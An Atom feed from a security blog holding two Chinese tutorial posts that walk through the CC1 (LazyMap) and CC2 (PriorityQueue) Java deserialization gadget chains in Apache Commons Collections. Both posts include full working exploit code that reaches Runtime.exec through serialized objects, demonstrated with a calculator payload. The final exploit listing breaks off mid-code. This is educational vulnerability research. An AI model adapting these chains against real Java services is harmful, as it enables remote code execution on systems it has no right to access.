<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WayneJH Blog</title>
  
  
  <link href="https://waynejoon.github.io/atom.xml" rel="self"/>
  
  <link href="https://waynejoon.github.io/"/>
  <updated>2025-11-12T09:28:36.016Z</updated>
  <id>https://waynejoon.github.io/</id>
  
  <author>
    <name>WayneJoon.H</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java反序列化 CC1链分析 (LazyMap)</title>
    <link href="https://waynejoon.github.io/posts/java-cc1-gadget-chain-analysis-lazymap/"/>
    <id>https://waynejoon.github.io/posts/java-cc1-gadget-chain-analysis-lazymap/</id>
    <published>2025-11-12T09:16:42.000Z</published>
    <updated>2025-11-12T09:28:36.016Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面我们介绍了<code>TransformedMap</code>的构造链，这条链易于理解，适合快速构造验证。今天我们来对之前的内容做补充，讲一下<code>LazyMap</code>这条构造链，该链是<code>ysoserial</code>中CC1链的构造方式，相比于<code>TransformedMap</code>的构造链，<code>LazyMap</code>链结构相对复杂但更灵活、扩展性强，<code>LazyMap</code>作为CC1的代表，其核心是懒加载和灵活插入的<code>transform</code>操作</p><p>链子有一部分跟之前<code>TransformedMap</code>构造链一样，如果忘记了如何构造，可以看看文章：<a href="https://blog.csdn.net/weixin_46263867/article/details/152521910?spm=1001.2014.3001.5502">Java反序列化 CC1链分析</a></p><p>先放个<code>TransformedMap</code>链的图回忆一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112164449604.png"></p><h2 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a>初步探索</h2><p>首先，我们先找哪些地方调用了<code>transform</code>，可以回到<code>Transformer.java</code>中<code>alt+F7</code>查找用法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112113757361.png"></p><p>之前我们走的是<code>TransformedMap.checkSetValue()</code>，这次我们就不走这个了，走<code>LazyMap</code>的<code>get</code>方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112114255058.png"></p><p>要求满足<code>map.containsKey(key) == false</code>才可以进入if语句调用<code>transform</code>，也就是要求map里面没有对应的key键名</p><p>接着我们看看<code>LazyMap</code>的构造方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112115010068.png"></p><p>可以传入<code>factory</code>，也就是<code>get</code>方法里的<code>factory</code>是可控的，但是该构造方法被<code>protected</code>修饰，不能直接调用，我们继续往下分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112115340497.png"></p><p>发现<code>decorate</code>方法返回了构造方法实例，且是<code>public</code>修饰，符合我们的要求</p><p>我们尝试构造代码，最后那里跟CC1调用<code>ChainedTransformer()</code>和<code>InvokerTransformer()</code>那部分一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(cs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        decorate.get(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112120439152.png"></p><h2 id="逐步完善"><a href="#逐步完善" class="headerlink" title="逐步完善"></a>逐步完善</h2><p>接下来我们就是要找哪里调用了<code>get</code>方法，<code>alt+F7</code>查找用法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112120832508.png"></p><p><code>get</code>方法的调用点非常多，有好几千个，在<code>ysoserial</code>工具中，作者最终使用了<code>AnnotationInvocationHandler</code>类作为触发<code>get</code>方法的关键跳板，其中的<code>invoke</code>里调用了<code>get</code>方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112121153392.png"></p><p>为了能顺利调用<code>get</code>方法，我们需要绕过前面的两个if语句</p><p>首先是第一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp; paramTypes[<span class="number">0</span>] == Object.class)</span><br></pre></td></tr></table></figure><p>我们只要调用的方法名不为<code>equals</code>就好</p><p>第二个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>要长度为0绕过，我们调用无参方法即可</p><p>然后我们分析构造函数</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112122030204.png"></p><p>发现<code>memberValues</code>可控，但是该构造函数没有修饰符在前面，也就是为默认的<code>Package-local</code>类型，无法直接外部调用，那我们可以用反射来实现</p><p>接下来就是看看如何触发<code>invoke</code>方法，我们来到开头这里，看到<code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>接口</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112122647878.png"></p><p>实现了<code>InvocationHandler</code>接口，表示该类可以作为动态代理的代理处理器，当调用代理对象的方法就会自动跳转到该类重写后的<code>invoke</code>方法执行，也就是我们前面提到的那个<code>invoke</code>，实现逻辑增强</p><p>如果对动态代理的概念不太熟悉，可以看看这两篇文章：</p><p><a href="https://liaoxuefeng.com/books/java/reflection/proxy/index.html">动态代理 - Java教程 - 廖雪峰的官方网站</a></p><p><a href="https://blog.csdn.net/2501_92540271/article/details/149389336">Java动态代理实现全解析：原理、实战与最佳实践</a></p><p>这样如何触发<code>invoke</code>的问题就解决了，我们把<code>AnnotationInvocationHandler</code>作为代理处理器就可以，剩下要解决的问题就是如何调用无参方法</p><p>我们继续分析<code>AnnotationInvocationHandler</code>类，发现<code>readObject</code>方法里调用了无参方法，刚好这里还是反序列化的入口，一举两得</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112134112102.png"></p><p>可以看到for循环里面对<code>memberValues</code>调用了无参方法<code>entrySet()</code>，而<code>entrySet()</code>是Map接口的一个抽象方法，且<code>LazyMap</code>是实现了Map接口的，符合我们的要求</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112134441634.png"></p><p>接下来我们来构造代码，先通过反射创建<code>AnnotationInvocationHandler</code>的构造实例，注意类型要强制转换为<code>InvocationHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) annotationConstructor.newInstance(Override.class, decorate);</span><br></pre></td></tr></table></figure><p>然后利用<code>Proxy.newProxyInstance()</code>创建Map接口的代理对象，设置<code>handler</code>为其代理处理器。接着再实例化构造器<code>annotationConstructor</code>，注解类我们随便传个<code>Override</code>，然后Map设置为<code>proxy</code>，完成闭环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Override.class, proxy);</span><br></pre></td></tr></table></figure><p>为了方便理解，我们放个图，这就是<code>LazyMap</code>的构造链</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112164329425.png"></p><h2 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h2><p>根据前面的内容，我们把代码结合起来，得到完整exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(cs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) annotationConstructor.newInstance(Override.class, decorate);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Override.class, proxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;cc1.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc1.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://oss.waynejoons.icu/picphoto/20251112140054633.png"></p><p>至此，CC1的<code>LazyMap</code>链分析完成</p>]]></content>
    
    
    <summary type="html">Java反序列化安全 CC1链复现与分析 (LazyMap篇)</summary>
    
    
    
    <category term="Java安全" scheme="https://waynejoon.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="https://waynejoon.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化 CC2链分析</title>
    <link href="https://waynejoon.github.io/posts/java-cc2-gadget-chain-analysis/"/>
    <id>https://waynejoon.github.io/posts/java-cc2-gadget-chain-analysis/</id>
    <published>2025-11-10T03:15:29.000Z</published>
    <updated>2025-11-10T04:10:11.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>CC2使用的是<code>PriorityQueue</code>和<code>javassist</code>来构造利用链，且对jdk版本要求没这么严格了，这里我继续沿用之前做CC1用的jdk8u-65</p><p>然后用的是<code>commons-collections 4.0</code>，因为只有4.0版本开始，<code>TransformingComparator</code>才支持序列化，从而能够被序列化流利用，完成包括通过<code>PriorityQueue</code>触发执行链的步骤</p><p>修改<code>pom.xml</code>文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.22.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在Maven同步项目即可</p><h2 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h2><h3 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a>初步探索</h3><p>首先我们讲链1，这条链不需要用到Javassist，会简单一些</p><p>反序列化入口地点为<code>PriorityQueue.readObject()</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251107122058787.png"></p><p>最后调用了<code>heapify()</code>方法，继续跟进看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107122445215.png"></p><p><code>&gt;&gt;&gt;</code>是无符号右移，<code>&gt;&gt;</code>是有符号右移，<code>size &gt;&gt;&gt; 1</code>表示将变量 size 的二进制位整体向右移动1位，也就是除以二保留整数。又因为要求<code>i &gt;= 0</code>，也就是size除以2保留整数然后减一要大于等于0，计算得到<code>i &gt;= 2</code>才可以进入循环，这个要记住，后面会用到</p><p>发现调用<code>siftDown()</code>方法，继续跟进</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107133604237.png"></p><p>可以看到有两个方法，我们先跟进<code>siftDownUsingComparator</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251107133729495.png"></p><p>调用了<code>comparator.compare()</code>方法，跟进<code>comparator</code>看看定义</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107134154585.png"></p><p>继续查看<code>Comparator</code>，发现是个接口，<code>compare</code>是它的抽象方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107134349404.png"></p><p>接下来就是查找有哪些类实现了<code>compare</code>方法且可以被后续利用，发现<code>TransformingComparator</code>类符合要求</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107134658811.png"></p><p>调用了<code>transformer.transform()</code>，接下来就跟CC1剩下的步骤一样，用<code>InvokerTransformer.transform()</code>来调用危险函数</p><p>我们先看看CC1的利用链，如果忘记了如何构造链子可以看<a href="https://blog.csdn.net/weixin_46263867/article/details/152521910?spm=1001.2014.3001.5502">Java反序列化 CC1链分析</a></p><p><img src="https://oss.waynejoons.icu/picphoto/20251110110107838.png"></p><p>再看看我们构造的CC2链</p><p><img src="https://oss.waynejoons.icu/picphoto/20251110000244703.png"></p><p>从<code>ChainedTransformer.transform()</code>一直到后面都是一样的，那我们可以先尝试构造代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>, transformingComparator);</span><br><span class="line">        <span class="comment">// 因为要i &gt;= 2，所以add两个</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2.ser&quot;</span>));</span><br><span class="line">            objectOutputStream.writeObject(queue);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2.ser&quot;</span>));</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是如果运行的话，会直接弹出两个计算器，而且我们想要的<code>cc2.ser</code>也没有生成</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107162720917.png"></p><p>终端还弹出了个异常</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107140514743.png"></p><p>那我们怎么解决，接下来深入分析一下</p><h3 id="逐步完善"><a href="#逐步完善" class="headerlink" title="逐步完善"></a>逐步完善</h3><p>先讲讲异常，<code>PriorityQueue</code>在 Java 中要求元素要么实现 <code>Comparable</code> 接口，要么在构造时提供 <code>Comparator</code>，但是由于<code>Runtime.exec</code>返回<code>ProcessImpl</code>实例，因此<code>TransformingComparator</code>的<code>transform</code>返回的是<code>ProcessImpl</code>，不是<code>Comparable</code>，所以抛出<code>ClassCastException</code>，后面调试时也可以看到</p><p>问AI解释如下</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107141441912.png"></p><p>接下来就是为什么不生成<code>cc2.ser</code>，我们在<code>PriorityQueue</code>的add函数打个断点调试</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107142742779.png"></p><p>当执行到<code>queue.add(2)</code>，<code>offer()</code>进入了else分支</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107143149758.png"></p><p>继续跟进，因为<code>comparator</code>不为null，进入<code>siftUpUsingComparator</code>方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107143255494.png"></p><p>继续跟，可以看到调用了<code>comparator.compare()</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251107143910315.png"></p><p>再次跟进，发现调用了<code>transformer.transform</code>，两个<code>transform</code>对应弹出两个计算器</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107144116410.png"></p><p>接下来调用<code>decorated.compare</code>来比较，但是因为两个都是<code>ProcessImpl</code>，无法比较，所以抛出异常结束</p><p>这也就导致后面的序列化和反序列化无法正常执行，因此我们要想办法绕过<code>siftUpUsingComparator</code>方法，让其先不要这么早抛出错误</p><p>由前面可知，当<code>comparator</code>为null会进入<code>siftDownComparable</code>方法，我们跟进看一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107145145732.png"></p><p>可以看到最后进行了赋值操作，没有调用<code>compare</code>方法。那我们可以把<code>queue</code>的<code>comparator</code>参数先去掉，让其先不要进入<code>siftUpUsingComparator</code>方法，然后通过反射给<code>comparator</code>赋值即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(queue, transformingComparator);</span><br></pre></td></tr></table></figure><p>这次成功进入<code>siftUpComparable</code>方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107162907500.png"></p><p>后面也是成功执行序列化和反序列化</p><p><img src="https://oss.waynejoons.icu/picphoto/20251107163337689.png"></p><h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>综上，我们得到完整exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> 